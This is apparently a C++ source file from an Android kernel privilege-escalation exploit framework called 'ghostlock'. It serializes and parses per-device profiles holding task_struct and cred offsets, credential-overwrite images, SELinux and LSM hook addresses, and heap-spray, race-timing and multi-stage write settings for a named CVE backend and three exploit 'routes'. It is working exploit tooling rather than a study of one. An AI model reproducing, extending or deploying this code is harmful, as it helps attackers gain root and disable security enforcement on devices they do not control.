#include "profile/binary.h"

#include <cstring>
#include <iterator>
#include <string_view>
#include <type_traits>

namespace ghostlock::binary_profile {
    namespace {
        /* Reinterpret one transport member as the wire's raw 64-bit record.
         * Signed members use two's complement; unsigned use the exact bits. */
        template<typename T>
        constexpr uint64_t to_raw(T value) noexcept {
            if constexpr (std::is_signed_v<T>) {
                return static_cast<uint64_t>(static_cast<int64_t>(value));
            } else {
                return static_cast<uint64_t>(value);
            }
        }

        template<typename T>
        constexpr T from_raw(uint64_t raw) noexcept {
            if constexpr (std::is_signed_v<T>) {
                return static_cast<T>(static_cast<int64_t>(raw));
            } else {
                return static_cast<T>(raw);
            }
        }

        /* One typed read/write pair over the transport struct. `has` is the
         * presence predicate: a PLAIN field is always present, an OPT field is
         * present only when its std::optional holds a value. This makes a
         * provided 0 distinct from an omitted field. */
        struct Field {
            std::string_view key;
            bool (*has)(const profile::kernel_offsets &);
            uint64_t (*load)(const profile::kernel_offsets &);
            void (*store)(profile::kernel_offsets &, uint64_t);
        };

#define PLAIN(key, member)                                                       \
    {                                                                            \
        key, [](const profile::kernel_offsets &o) { return true; },              \
                [](const profile::kernel_offsets &o) { return to_raw(o.member); },\
                [](profile::kernel_offsets &o, uint64_t r) {                    \
                    o.member = from_raw<decltype(o.member)>(r);                 \
                }                                                            \
    }
#define OPT(key, member)                                                         \
    {                                                                            \
        key, [](const profile::kernel_offsets &o) { return o.member.has_value(); },\
                [](const profile::kernel_offsets &o) {                          \
                    return o.member ? to_raw(*o.member) : uint64_t{0};          \
                },                                                           \
                [](profile::kernel_offsets &o, uint64_t r) {                    \
                    o.member = from_raw<                                           \
                        std::remove_reference_t<decltype(*o.member)>>(r);        \
                }                                                            \
    }

        constexpr Field kMeta[] = {
            PLAIN("kernel_major", meta.kernel_major),
            PLAIN("recommend_shizuku", meta.recommend_shizuku),
            PLAIN("fallback_route", meta.fallback_route),
            PLAIN("safe_mode", meta.safe_mode),
                    /* Ancillary behavior gate (vivo vr.ko guard). */
            PLAIN("vr_guard", misc.vr_guard),
        };

        constexpr Field kTask[] = {
            PLAIN("prio", task.prio), PLAIN("normal_prio", task.normal_prio),
            PLAIN("sched_task_group", task.sched_task_group),
            PLAIN("pi_lock", task.pi_lock), PLAIN("pi_waiters", task.pi_waiters),
            PLAIN("pi_top_task", task.pi_top_task),
            PLAIN("pi_blocked_on", task.pi_blocked_on),
            PLAIN("pid", task.pid), PLAIN("tgid", task.tgid),
            PLAIN("atomic_flags", task.atomic_flags),
            PLAIN("real_cred", task.real_cred), PLAIN("cred", task.cred),
            PLAIN("comm", task.comm), PLAIN("tasks", task.tasks),
            PLAIN("seccomp", task.seccomp),
        };

        constexpr Field kCred[] = {
            PLAIN("copy_size", credential.copy_size),
            PLAIN("usage_offset", credential.usage_offset),
            PLAIN("usage_value", credential.usage_value),
            PLAIN("caps_offset", credential.caps_offset),
            PLAIN("caps_count", credential.caps_count),
            PLAIN("caps_value", credential.caps_value),
            PLAIN("ref_count", credential.ref_count),
            PLAIN("ref0_offset", credential.ref0_offset),
            PLAIN("ref1_offset", credential.ref1_offset),
            PLAIN("ref2_offset", credential.ref2_offset),
            PLAIN("ref3_offset", credential.ref3_offset),
            PLAIN("ref0_image", credential.ref0_image),
            PLAIN("ref1_image", credential.ref1_image),
            PLAIN("ref2_image", credential.ref2_image),
            PLAIN("ref3_image", credential.ref3_image),
        };

        constexpr Field kOffset[] = {
            PLAIN("init_task", offsets.init_task),
            PLAIN("init_cred", offsets.init_cred),
            PLAIN("empty_zero_page", offsets.empty_zero_page),
            PLAIN("root_task_group", offsets.root_task_group),
            PLAIN("selinux_enforcing", offsets.selinux_enforcing),
            PLAIN("selinux_blob_sizes", offsets.selinux_blob_sizes),
            PLAIN("security_hook_heads", offsets.security_hook_heads),
            PLAIN("slide_nfulnl_logger", offsets.slide_nfulnl_logger),
            PLAIN("slide_loggers_0_1", offsets.slide_loggers_0_1),
            PLAIN("slide_boot_id", offsets.slide_boot_id),
            /* Ancillary vr.ko guard: the tracepoint the vendor probe hangs off. */
            PLAIN("vr_sys_exit_tp", misc.vr_sys_exit_tp),
        };

        constexpr Field kKernel[] = {
            OPT("kernel_phys_load", misc.kernel_phys_load),
            OPT("compact_waiter", misc.compact_waiter),
            OPT("kernelsnitch_collisions", misc.kernelsnitch_collisions),
            OPT("mm_struct_sz", misc.mm_struct_sz),
        };

        constexpr Field kExecCpus[] = {
            PLAIN("main", execution.recommended_main_cpu),
            PLAIN("consumer", execution.recommended_consumer_cpu),
        };

        constexpr Field kExecHeap[] = {
            PLAIN("prepare_max_attempts", execution.heap_prepare_max_attempts),
            PLAIN("prepare_timeout_ms", execution.heap_prepare_timeout_ms),
            PLAIN("kernelsnitch_timeout_ms",
                  execution.heap_kernelsnitch_timeout_ms),
        };

        constexpr Field kExecRace[] = {
            PLAIN("route_wait_ms", execution.race_route_wait_ms),
            PLAIN("route_done_timeout_ms", execution.race_route_done_timeout_ms),
            PLAIN("setup_settle_us", execution.race_setup_settle_us),
            PLAIN("state_poll_interval_us",
                  execution.race_state_poll_interval_us),
        };

        constexpr Field kExecStages[] = {
            PLAIN("w1_attempts", execution.w1_attempts),
            PLAIN("w1_settle_us", execution.w1_settle_us),
            PLAIN("w1_scratch_repair_attempts",
                  execution.w1_scratch_repair_attempts),
            PLAIN("w2_attempts", execution.w2_attempts),
            PLAIN("w2_settle_us", execution.w2_settle_us),
            PLAIN("w3_chain_rounds", execution.w3_chain_rounds),
            PLAIN("w3_attempts", execution.w3_attempts),
            PLAIN("w3_settle_us", execution.w3_settle_us),
        };

        constexpr Field kExecHandoff[] = {
            PLAIN("pre_dispatch_settle_ms",
                  execution.handoff_pre_dispatch_settle_ms),
            PLAIN("module_poll_attempts",
                  execution.handoff_module_poll_attempts),
            PLAIN("module_poll_interval_ms",
                  execution.handoff_module_poll_interval_ms),
            PLAIN("enforce_poll_attempts",
                  execution.handoff_enforce_poll_attempts),
            PLAIN("enforce_poll_interval_ms",
                  execution.handoff_enforce_poll_interval_ms),
        };

        constexpr Field kExecConsumer[] = {
            PLAIN("max_calls", execution.select_consumer_max_calls),
            PLAIN("burst_calls", execution.select_consumer_burst_calls),
        };

        /* Ancillary vr.ko guard layout: offsetof(struct tracepoint, funcs),
         * derived from the image's BTF. Not a kernel-version lookup. */
        constexpr Field kVrGuard[] = {
            PLAIN("tracepoint_funcs", misc.vr_tracepoint_funcs),
        };

        constexpr Field kRouteTcp[] = {
            PLAIN("attempts", execution.tcp_attempts),
            PLAIN("arm_sequence", execution.tcp_arm_sequence),
            PLAIN("post_receive_hold_iterations",
                  execution.tcp_post_receive_hold_iterations),
        };

        constexpr Field kRouteSelect[] = {
            OPT("waiter_shift", geometry.pselect_waiter_shift),
            OPT("compact_waiter", misc.compact_waiter),
            PLAIN("enter_delay_us", execution.select_enter_delay_us),
            PLAIN("timeout_us", execution.select_timeout_us),
        };

        constexpr Field kRouteMulticast[] = {
            OPT("waiter_off", geometry.mcast_waiter_off),
            OPT("buffer_size", geometry.mcast_buffer_size),
            OPT("task_offset", geometry.mcast_task_offset),
            OPT("lock_offset", geometry.mcast_lock_offset),
            /* Poison/walk repetition; 0 means "keep the route default". */
            PLAIN("attempts", mcast_attempts),
            PLAIN("arm_sequence", mcast_arm_sequence),
            PLAIN("arm_hold", mcast_arm_hold),
        };

        struct Section {
            std::string_view name;
            const Field *fields;
            size_t count;
        };

        constexpr Section kSections[] = {
            {"meta", kMeta, std::size(kMeta)},
            {"task_struct", kTask, std::size(kTask)},
            {"cred", kCred, std::size(kCred)},
            {"offset", kOffset, std::size(kOffset)},
            {"kernel", kKernel, std::size(kKernel)},
            {"execution.recommended_cpus", kExecCpus, std::size(kExecCpus)},
            {"execution.heap", kExecHeap, std::size(kExecHeap)},
            {"execution.race", kExecRace, std::size(kExecRace)},
            {"execution.stages", kExecStages, std::size(kExecStages)},
            {"execution.handoff", kExecHandoff, std::size(kExecHandoff)},
            {"execution.consumer", kExecConsumer, std::size(kExecConsumer)},
            {"route.tcp_zerocopy", kRouteTcp, std::size(kRouteTcp)},
            {"route.select_stack", kRouteSelect, std::size(kRouteSelect)},
            {"route.multicast_waiter", kRouteMulticast, std::size(kRouteMulticast)},
            {"vr_guard", kVrGuard, std::size(kVrGuard)},
        };
#undef PLAIN
#undef OPT

        const size_t kHeaderSize = 16;

        std::string_view route_section_name(uint8_t route) {
            switch (route) {
                case profile::kRouteTcpZerocopy:
                    return "route.tcp_zerocopy";
                case profile::kRouteSelectStack:
                    return "route.select_stack";
                case profile::kRouteMulticastWaiter:
                    return "route.multicast_waiter";
                default:
                    return {};
            }
        }

        uint64_t read_le(const uint8_t *bytes, size_t width) {
            uint64_t value = 0;
            for (size_t i = 0; i < width; i++) {
                value |= static_cast<uint64_t>(bytes[i]) << (8 * i);
            }
            return value;
        }

        void write_le(uint8_t *bytes, uint64_t value, size_t width) {
            for (size_t i = 0; i < width; i++) {
                bytes[i] = static_cast<uint8_t>(value >> (8 * i));
            }
        }

        size_t present_count(const Section &section,
                             const profile::kernel_offsets &in) {
            size_t n = 0;
            for (size_t i = 0; i < section.count; i++) {
                if (section.fields[i].has(in)) n++;
            }
            return n;
        }

        int32_t parse_v2(std::string_view document, profile::kernel_offsets *out,
                         char *release_buf, size_t release_buf_cap,
                         component_ids *ids) {
            const auto *bytes = reinterpret_cast<const uint8_t *>(document.data());
            const auto *end = bytes + document.size();
            if (document.size() < kHeaderSize) return -1;
            if (read_le(bytes, 4) != kMagic) return -1;
            if (read_le(bytes + 4, 2) != kVersion) return -1;
            const uint16_t frontend = static_cast<uint16_t>(read_le(bytes + 6, 2));
            const uint16_t backend = static_cast<uint16_t>(read_le(bytes + 8, 2));
            const uint16_t middleware = static_cast<uint16_t>(read_le(bytes + 10, 2));
            if (!frontend_known(frontend) || !backend_known(backend)) return -1;
            if (middleware > 0xff) return -1;
            const size_t release_length = static_cast<size_t>(read_le(bytes + 12, 2));
            if (kHeaderSize + release_length > document.size()) return -1;
            if (release_length + 1 > release_buf_cap) return -1;
            memcpy(release_buf, bytes + kHeaderSize, release_length);
            release_buf[release_length] = '\0';

            *out = profile::kernel_offsets{};
            out->uname_r = release_buf;
            out->route = static_cast<uint8_t>(middleware & 0xff);
            /* The route is profile-controlled: an unresolved or unknown route
             * is rejected instead of being inferred. */
            if (out->route != profile::kRouteTcpZerocopy &&
                out->route != profile::kRouteSelectStack &&
                out->route != profile::kRouteMulticastWaiter) {
                return -1;
            }

            const uint8_t *p = bytes + kHeaderSize + release_length;
            if (p + 2 > end) return -1;
            size_t sections = static_cast<size_t>(read_le(p, 2));
            p += 2;
            for (size_t s = 0; s < sections; s++) {
                if (p + 1 > end) return -1;
                const size_t name_len = *p++;
                if (p + name_len + 4 > end) return -1;
                const std::string_view name(reinterpret_cast<const char *>(p),
                                            name_len);
                p += name_len;
                const size_t entries = static_cast<size_t>(read_le(p, 4));
                p += 4;
                const Section *section = nullptr;
                /* A route section only applies to the document's own route;
                 * other-route sections are ignored (never silently merged). */
                if (!name.starts_with("route.") ||
                    name == route_section_name(out->route)) {
                    for (const Section &candidate: kSections) {
                        if (candidate.name == name) {
                            section = &candidate;
                            break;
                        }
                    }
                }
                for (size_t e = 0; e < entries; e++) {
                    if (p + 1 > end) return -1;
                    const size_t key_len = *p++;
                    if (p + key_len + 8 > end) return -1;
                    const std::string_view key(reinterpret_cast<const char *>(p),
                                               key_len);
                    const uint64_t raw = read_le(p + key_len, 8);
                    p += key_len + 8;
                    if (!section) continue;
                    for (size_t i = 0; i < section->count; i++) {
                        if (section->fields[i].key == key) {
                            section->fields[i].store(*out, raw);
                            break;
                        }
                    }
                }
            }
            if (ids) *ids = {frontend, backend, middleware};
            return 0;
        }
    } // namespace

    int32_t parse(std::string_view document, profile::kernel_offsets *out,
                  char *release_buf, size_t release_buf_cap, component_ids *ids) {
        if (!out || !release_buf || document.size() < kHeaderSize) return -1;
        return parse_v2(document, out, release_buf, release_buf_cap, ids);
    }

    int32_t serialize(const profile::kernel_offsets *in, char *buffer,
                      size_t capacity) {
        if (!in || !buffer || !in->uname_r) return -1;
        if (in->route == profile::kRouteAuto) return -1;
        const size_t release_length = strlen(in->uname_r);
        if (release_length > 0xffff) return -1;

        /* Sections with at least one present field, and their byte cost. */
        const Section *emitted[std::size(kSections)];
        size_t emitted_count = 0;
        size_t total = kHeaderSize + release_length + 2;
        for (const Section &section: kSections) {
            /* Only the active route's section is written. */
            if (section.name.starts_with("route.") &&
                section.name != route_section_name(in->route)) {
                continue;
            }
            const size_t n = present_count(section, *in);
            if (n == 0) continue;
            emitted[emitted_count++] = &section;
            total += 1 + section.name.size() + 4;
            for (size_t i = 0; i < section.count; i++) {
                if (!section.fields[i].has(*in)) continue;
                total += 1 + section.fields[i].key.size() + 8;
            }
        }
        if (total > capacity) return -1;

        auto *bytes = reinterpret_cast<uint8_t *>(buffer);
        memset(bytes, 0, kHeaderSize);
        write_le(bytes, kMagic, 4);
        write_le(bytes + 4, kVersion, 2);
        write_le(bytes + 6, kFrontendRootChild, 2);
        write_le(bytes + 8, kBackendCve202643499, 2);
        write_le(bytes + 10, in->route, 2);
        write_le(bytes + 12, release_length, 2);
        memcpy(bytes + kHeaderSize, in->uname_r, release_length);

        uint8_t *p = bytes + kHeaderSize + release_length;
        write_le(p, emitted_count, 2);
        p += 2;
        for (size_t s = 0; s < emitted_count; s++) {
            const Section &section = *emitted[s];
            *p++ = static_cast<uint8_t>(section.name.size());
            memcpy(p, section.name.data(), section.name.size());
            p += section.name.size();
            write_le(p, present_count(section, *in), 4);
            p += 4;
            for (size_t i = 0; i < section.count; i++) {
                const Field &field = section.fields[i];
                if (!field.has(*in)) continue;
                *p++ = static_cast<uint8_t>(field.key.size());
                memcpy(p, field.key.data(), field.key.size());
                p += field.key.size();
                write_le(p, field.load(*in), 8);
                p += 8;
            }
        }
        return static_cast<int32_t>(p - bytes);
    }
} // namespace ghostlock::binary_profile
